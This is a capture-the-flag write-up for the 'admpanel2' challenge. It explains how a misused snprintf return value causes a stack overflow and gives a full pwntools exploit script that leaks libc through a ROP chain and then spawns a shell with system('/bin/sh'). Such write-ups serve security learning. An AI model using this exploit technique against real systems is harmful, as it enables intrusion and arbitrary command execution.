# amdpanel2
> LongChampion, 06/04/2020

## Challenge
This challenge is exactly `admpanel` with a patch, so you can't inject command anymore.  
So let we move our attention to other place, and the most potential target is `Notice`:
```cpp
char *__fastcall Notice(char *a1, int IsAdmin, char *user, _BYTE *command)
{
  char *result; // rax
  _BYTE *Command; // [rsp+0h] [rbp-140h]
  char *User; // [rsp+8h] [rbp-138h]
  char buf; // [rsp+20h] [rbp-120h]
  int counter; // [rsp+12Ch] [rbp-14h]
  size_t maxlen; // [rsp+130h] [rbp-10h]
  char *p; // [rsp+138h] [rbp-8h]

  User = user;
  Command = command;
  p = &buf;
  maxlen = 256LL;
  counter = snprintf(&buf, 0x100uLL, "LOG: [OPERATION: %s] ", a1);
  if ( counter < 0 )
    exit(1);
  p += counter;
  maxlen -= counter;
  if ( IsAdmin )
  {
    counter = snprintf(p, maxlen, "[USERNAME: %s] ", User);
    if ( counter < 0 )
      exit(1);
    p += counter;
    maxlen -= counter;
  }
  if ( *Command )
  {
    counter = snprintf(p, maxlen, "%s", Command);
    if ( counter < 0 )
      exit(1);
    p += counter;
    maxlen -= counter;
  }
  fprintf(stderr, "%s\n", &buf);
  if ( IsAdmin )
    result = User;
  else
    result = 0LL;
  return result;
}
```
I have read this function and assembly of it carefully, but I didn't see any vulnerability here.  
Few hours later, my friend (@midas) given me an interesting hint about [`snprintf`](http://www.cplusplus.com/reference/cstdio/snprintf/):
```
If the resulting string would be longer than n-1 characters, the remaining characters are discarded and not stored, but counted for the value returned by the function.
```
Well, according to this property, if our `User` is long enough, we can make `maxlen` be negative. It lead to an buffer overflow!  
Note that the binary is compare only first 5 bytes of out username with "admin", so any username begin with "admin" will work.

## Solution
```python
#!/usr/bin/env python2
from pwn import *
context.binary = "./admpanel2"

r = remote("admpanel2-01.play.midnightsunctf.se", 31337)
lib = ELF("./libc.so", checksec=False)


def Login(User, Pass):
    r.sendlineafter(">", "1")
    r.sendlineafter("username:", User)
    r.sendlineafter("password:", Pass)


def Run(Command):
    r.sendlineafter(">", "2")
    r.sendlineafter("execute:", Command)


Login("admin".ljust(250, 'A'), "password".ljust(250, 'B'))

ret = 0x401016
pop_rdi = 0x4016cb
puts_got = 0x404020
puts_plt = 0x401040
main_addr = 0x4015D0

Run(p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr))
Leak = r.recvline()
Leak = r.recvline()[:-1]
print "Leak =", Leak
Leak = u64(Leak.ljust(8, '\0'))
log.info("Leak: " + hex(Leak))
LIBC = Leak - lib.symbols["puts"]
log.success("LIBC: " + hex(LIBC))

Login("admin".ljust(250, 'A'), "password".ljust(250, 'B'))
system = LIBC + lib.symbols["system"]
binsh = LIBC + lib.search("/bin/sh\0").next()
Run(p64(ret) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))

r.interactive()
```
Any question like "How long is the username?" or "Why these is a ret gadget in payload?" can be answer by debug the binary.
